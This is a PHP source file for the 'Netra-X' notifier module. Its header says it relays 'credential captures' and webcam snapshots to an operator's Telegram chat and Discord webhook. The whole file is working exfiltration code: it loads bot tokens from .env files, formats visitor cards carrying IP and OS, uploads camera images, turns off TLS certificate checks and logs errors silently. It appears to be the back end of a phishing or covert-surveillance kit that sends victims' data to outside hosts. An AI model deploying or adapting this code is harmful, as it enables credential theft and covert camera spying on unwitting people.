<?php
/* ════════════════════════════════════════════════════════════════════
   core/telegram_webhook.php  --  Real-Time Telegram Bot Notifier
   ---------------------------------------------------------------
   A modular, robust notification engine that sends instant alerts,
   telemetry reports, credential captures, and camera images directly
   to your Telegram Chat / Channel.

   Supports:
     - HTML-formatted rich alerts
     - Photo / Webcam Snapshot uploads
     - Automatic, cross-platform .env configuration
     - Silent error logging to data/telegram_errors.log
   ════════════════════════════════════════════════════════════════════ */

/* ── Robust Environment Loader ────────────────────────────────── */
function _nxLoadEnvConfig(): array {
    $candidates = [
        dirname(__DIR__) . '/.env',
        __DIR__ . '/../.env',
        getcwd() . '/.env',
        (isset($_SERVER['DOCUMENT_ROOT']) && $_SERVER['DOCUMENT_ROOT']) ? rtrim($_SERVER['DOCUMENT_ROOT'], '/\\') . '/.env' : ''
    ];

    $config = [
        'TELEGRAM_BOT_TOKEN'  => getenv('TELEGRAM_BOT_TOKEN') ?: ($_ENV['TELEGRAM_BOT_TOKEN'] ?? ($_SERVER['TELEGRAM_BOT_TOKEN'] ?? '')),
        'TELEGRAM_CHAT_ID'    => getenv('TELEGRAM_CHAT_ID') ?: ($_ENV['TELEGRAM_CHAT_ID'] ?? ($_SERVER['TELEGRAM_CHAT_ID'] ?? '')),
        'DISCORD_WEBHOOK_URL' => getenv('DISCORD_WEBHOOK_URL') ?: ($_ENV['DISCORD_WEBHOOK_URL'] ?? ($_SERVER['DISCORD_WEBHOOK_URL'] ?? ''))
    ];

    foreach ($candidates as $env_file) {
        if (!empty($env_file) && is_file($env_file) && is_readable($env_file)) {
            $lines = @file($env_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            if ($lines !== false) {
                foreach ($lines as $line) {
                    $line = trim($line);
                    if ($line === '' || $line[0] === '#' || $line[0] === ';') {
                        continue;
                    }
                    if (stripos($line, 'export ') === 0) {
                        $line = trim(substr($line, 7));
                    }
                    if (strpos($line, '=') === false) {
                        continue;
                    }
                    list($key, $val) = explode('=', $line, 2);
                    $key = trim($key);
                    $val = trim($val);

                    if ($val !== '') {
                        if (($val[0] === '"' && substr($val, -1) === '"') || ($val[0] === "'" && substr($val, -1) === "'")) {
                            $val = substr($val, 1, -1);
                        } else {
                            $commentPos = strpos($val, '#');
                            if ($commentPos !== false) {
                                $val = trim(substr($val, 0, $commentPos));
                            }
                        }
                    }
                    $val = trim($val, " \t\n\r\0\x0B\"'");

                    if ($key === 'TELEGRAM_BOT_TOKEN' && !empty($val)) {
                        $config['TELEGRAM_BOT_TOKEN'] = $val;
                    } elseif ($key === 'TELEGRAM_CHAT_ID' && !empty($val)) {
                        $config['TELEGRAM_CHAT_ID'] = $val;
                    } elseif ($key === 'DISCORD_WEBHOOK_URL' && !empty($val)) {
                        $config['DISCORD_WEBHOOK_URL'] = $val;
                    }
                }
                break;
            }
        }
    }

    foreach ($config as $k => $v) {
        $config[$k] = trim((string)$v, " \t\n\r\0\x0B\"'");
    }

    return $config;
}

$env_cfg = _nxLoadEnvConfig();

if (!defined('TELEGRAM_BOT_TOKEN')) {
    define('TELEGRAM_BOT_TOKEN', $env_cfg['TELEGRAM_BOT_TOKEN']);
}
if (!defined('TELEGRAM_CHAT_ID')) {
    define('TELEGRAM_CHAT_ID', $env_cfg['TELEGRAM_CHAT_ID']);
}
if (!defined('DISCORD_WEBHOOK_URL')) {
    define('DISCORD_WEBHOOK_URL', $env_cfg['DISCORD_WEBHOOK_URL']);
}

define('TELEGRAM_LOG_FILE', dirname(__DIR__) . '/data/telegram_errors.log');
define('DISCORD_LOG_FILE', dirname(__DIR__) . '/data/discord_errors.log');

/* ════════════════════════════════════════════════════════════════════
   PUBLIC TELEGRAM API
   ════════════════════════════════════════════════════════════════════ */

/**
 * Send a simple text notification to Telegram.
 *
 * @param  string $message  Text to send
 * @return bool             True on success
 */
function sendTelegramNotification(string $message): bool
{
    if (empty(TELEGRAM_BOT_TOKEN) || empty(TELEGRAM_CHAT_ID)) {
        return false;
    }

    $url = 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage';
    $params = [
        'chat_id'                  => TELEGRAM_CHAT_ID,
        'text'                     => (strlen($message) > 4000) ? substr($message, 0, 3990) . '...' : $message,
        'parse_mode'               => 'HTML',
        'disable_web_page_preview' => true,
    ];

    return _telegramPost($url, $params);
}

/**
 * Send a structured, formatted alert card to Telegram.
 *
 * @param  string $title   Alert header (e.g. "⚡ New Visitor Arrived")
 * @param  array  $fields  Key-value pairs (e.g. ['IP' => '1.2.3.4', 'OS' => 'Windows'])
 * @return bool            True on success
 */
function sendTelegramAlert(string $title, array $fields = []): bool
{
    $has_tg = (!empty(TELEGRAM_BOT_TOKEN) && !empty(TELEGRAM_CHAT_ID));
    $has_dc = (!empty(DISCORD_WEBHOOK_URL));

    $tg_success = false;

    if ($has_tg) {
        $text  = "<b>" . htmlspecialchars($title, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</b>\n";
        $text .= "━━━━━━━━━━━━━━━━━━━━\n";

        foreach ($fields as $key => $val) {
            $k = htmlspecialchars((string) $key, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
            $vRaw = (string) $val;
            if (strlen($vRaw) > 250) {
                $vRaw = substr($vRaw, 0, 247) . '...';
            }
            $v = htmlspecialchars($vRaw, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
            $text .= "<b>{$k}:</b> <code>{$v}</code>\n";
        }

        $text .= "━━━━━━━━━━━━━━━━━━━━\n";
        $text .= "🕒 <i>" . date('Y-m-d H:i:s T') . "</i>";

        if (strlen($text) > 4000) {
            $text = substr($text, 0, 3950) . "\n...[truncated]\n" . "🕒 <i>" . date('Y-m-d H:i:s T') . "</i>";
        }

        $url = 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage';
        $params = [
            'chat_id'                  => TELEGRAM_CHAT_ID,
            'text'                     => $text,
            'parse_mode'               => 'HTML',
            'disable_web_page_preview' => true,
        ];

        $tg_success = _telegramPost($url, $params);
    }

    // Dual dispatch to Discord if configured
    if ($has_dc) {
        $embed_fields = [];
        foreach ($fields as $name => $value) {
            $embed_fields[] = [
                'name'   => (string) $name,
                'value'  => '`' . (strlen((string)$value) > 250 ? substr((string)$value, 0, 247) . '...' : (string)$value) . '`',
                'inline' => false,
            ];
        }
        $payload = json_encode([
            'username' => 'Netra-X Bot',
            'embeds'   => [[
                'title'     => $title,
                'color'     => 0x0088CC, // Telegram Blue
                'fields'    => $embed_fields,
                'footer'    => ['text' => 'Netra-X • ' . date('Y-m-d H:i:s T')],
                'timestamp' => date('c'),
            ]],
        ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
        _discordPost(DISCORD_WEBHOOK_URL, $payload);
    }

    return $tg_success;
}

/**
 * Send an image / webcam snapshot directly to Telegram as a photo card.
 *
 * @param  string $filepath Absolute path to image file
 * @param  string $caption  Caption text
 * @return bool             True on success
 */
function sendTelegramImage(string $filepath, string $caption = '📸 Webcam snapshot captured.'): bool
{
    $has_tg = (!empty(TELEGRAM_BOT_TOKEN) && !empty(TELEGRAM_CHAT_ID));
    $has_dc = (!empty(DISCORD_WEBHOOK_URL));

    $tg_success = false;

    if ($has_tg && is_file($filepath) && is_readable($filepath)) {
        $url = 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendPhoto';

        $cleanCaption = (strlen($caption) > 850) ? substr($caption, 0, 847) . '...' : $caption;
        $captionHtml  = "<b>" . htmlspecialchars($cleanCaption, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</b>\n🕒 <i>" . date('Y-m-d H:i:s T') . "</i>";

        $mime = 'image/png';
        if (function_exists('mime_content_type')) {
            $m = @mime_content_type($filepath);
            if (!empty($m)) $mime = $m;
        }

        if (function_exists('curl_init')) {
            $ch = curl_init();
            $cfile = class_exists('CURLFile') ? new CURLFile($filepath, $mime, basename($filepath)) : '@' . realpath($filepath);
            $postFields = [
                'chat_id'    => TELEGRAM_CHAT_ID,
                'photo'      => $cfile,
                'caption'    => $captionHtml,
                'parse_mode' => 'HTML',
            ];

            curl_setopt_array($ch, [
                CURLOPT_URL            => $url,
                CURLOPT_POST           => true,
                CURLOPT_POSTFIELDS     => $postFields,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT        => 20,
                CURLOPT_CONNECTTIMEOUT => 8,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => 0,
                CURLOPT_USERAGENT      => 'NetraX-Notifier/3.0',
            ]);

            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $curlErr  = curl_error($ch);
            curl_close($ch);

            if ($httpCode >= 200 && $httpCode < 300) {
                $respJson = json_decode((string)$response, true);
                if (isset($respJson['ok']) && $respJson['ok'] === true) {
                    $tg_success = true;
                } else {
                    _telegramLogError("sendPhoto failed API: {$response}");
                }
            } else {
                _telegramLogError("sendPhoto failed HTTP {$httpCode}: {$response}" . ($curlErr ? " | cURL: {$curlErr}" : ''));
            }
        }
    }

    // Dual dispatch to Discord if configured
    if ($has_dc) {
        _discordPostImage(DISCORD_WEBHOOK_URL, $filepath, $caption);
    }

    return $tg_success;
}

/* ════════════════════════════════════════════════════════════════════
   BACKWARD COMPATIBILITY ALIASES
   ════════════════════════════════════════════════════════════════════ */

if (!function_exists('sendDiscordAlert')) {
    function sendDiscordAlert(string $title, array $fields = [], int $color = 0x0088CC): bool
    {
        return sendTelegramAlert($title, $fields);
    }
}

if (!function_exists('sendDiscordImage')) {
    function sendDiscordImage(string $filepath, string $caption = '', string $username = ''): bool
    {
        return sendTelegramImage($filepath, $caption ?: '📸 Image capture received.');
    }
}

if (!function_exists('sendDiscordNotification')) {
    function sendDiscordNotification(string $message = 'Notification received.', string $username = ''): bool
    {
        return sendTelegramNotification($message);
    }
}

/* ════════════════════════════════════════════════════════════════════
   INTERNAL HELPERS
   ════════════════════════════════════════════════════════════════════ */

function _telegramPost(string $url, array $params): bool
{
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL            => $url,
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => http_build_query($params),
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => 12,
            CURLOPT_CONNECTTIMEOUT => 6,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_USERAGENT      => 'NetraX-Notifier/3.0',
        ]);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curlErr  = curl_error($ch);
        curl_close($ch);

        if ($httpCode >= 200 && $httpCode < 300) {
            $respJson = json_decode((string)$response, true);
            if (isset($respJson['ok']) && $respJson['ok'] === true) {
                return true;
            }
            _telegramLogError("Telegram sendMessage API error: {$response}");
            return false;
        }

        _telegramLogError("sendMessage failed HTTP {$httpCode}: {$response}" . ($curlErr ? " | cURL: {$curlErr}" : ''));
        return false;
    }

    // Stream context fallback
    $opts = [
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\nUser-Agent: NetraX-Notifier/3.0\r\n",
            'content' => http_build_query($params),
            'timeout' => 12,
            'ignore_errors' => true,
        ],
        'ssl' => [
            'verify_peer'      => false,
            'verify_peer_name' => false,
        ]
    ];
    $ctx = stream_context_create($opts);
    $res = @file_get_contents($url, false, $ctx);
    if ($res !== false) {
        $respJson = json_decode((string)$res, true);
        if (isset($respJson['ok']) && $respJson['ok'] === true) {
            return true;
        }
        _telegramLogError("Telegram stream post API error: " . substr($res, 0, 300));
        return false;
    }

    $err = error_get_last();
    _telegramLogError("Stream context post failed for {$url}" . ($err ? " | " . $err['message'] : ''));
    return false;
}

function _telegramLogError(string $msg): void
{
    $logDir = dirname(TELEGRAM_LOG_FILE);
    if (!is_dir($logDir)) {
        @mkdir($logDir, 0750, true);
    }
    @file_put_contents(TELEGRAM_LOG_FILE, '[' . date('Y-m-d H:i:s') . '] ' . $msg . "\n", FILE_APPEND);
}

function _discordPost(string $webhook_url, string $json_payload): bool
{
    if (empty($webhook_url) || !filter_var($webhook_url, FILTER_VALIDATE_URL)) {
        return false;
    }

    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL            => $webhook_url,
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => $json_payload,
            CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => 10,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_USERAGENT      => 'NetraX-Notifier/3.0',
        ]);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curlErr  = curl_error($ch);
        curl_close($ch);

        if ($httpCode >= 200 && $httpCode < 300) {
            return true;
        }

        _discordLogError("Discord webhook failed HTTP {$httpCode}: {$response}" . ($curlErr ? " | cURL: {$curlErr}" : ''));
        return false;
    }

    $opts = [
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: application/json\r\nUser-Agent: NetraX-Notifier/3.0\r\n",
            'content' => $json_payload,
            'timeout' => 10,
            'ignore_errors' => true,
        ],
        'ssl' => [
            'verify_peer'      => false,
            'verify_peer_name' => false,
        ]
    ];
    $ctx = stream_context_create($opts);
    $res = @file_get_contents($webhook_url, false, $ctx);
    if ($res !== false) {
        return true;
    }

    _discordLogError("Discord stream post failed for {$webhook_url}");
    return false;
}

function _discordPostImage(string $webhook_url, string $filepath, string $caption = ''): bool
{
    if (empty($webhook_url) || !is_file($filepath) || !is_readable($filepath)) {
        return false;
    }

    $mime = 'image/png';
    if (function_exists('mime_content_type')) {
        $m = @mime_content_type($filepath);
        if (!empty($m)) $mime = $m;
    }

    if (function_exists('curl_init')) {
        $ch = curl_init();
        $cfile = class_exists('CURLFile') ? new CURLFile($filepath, $mime, basename($filepath)) : '@' . realpath($filepath);
        $postFields = [
            'file'    => $cfile,
            'content' => $caption,
        ];

        curl_setopt_array($ch, [
            CURLOPT_URL            => $webhook_url,
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => $postFields,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => 15,
            CURLOPT_CONNECTTIMEOUT => 6,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_USERAGENT      => 'NetraX-Notifier/3.0',
        ]);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curlErr  = curl_error($ch);
        curl_close($ch);

        if ($httpCode >= 200 && $httpCode < 300) {
            return true;
        }

        _discordLogError("Discord image upload failed HTTP {$httpCode}: {$response}" . ($curlErr ? " | cURL: {$curlErr}" : ''));
        return false;
    }

    return false;
}

function _discordLogError(string $msg): void
{
    $logDir = dirname(DISCORD_LOG_FILE);
    if (!is_dir($logDir)) {
        @mkdir($logDir, 0750, true);
    }
    @file_put_contents(DISCORD_LOG_FILE, '[' . date('Y-m-d H:i:s') . '] ' . $msg . "\n", FILE_APPEND);
}
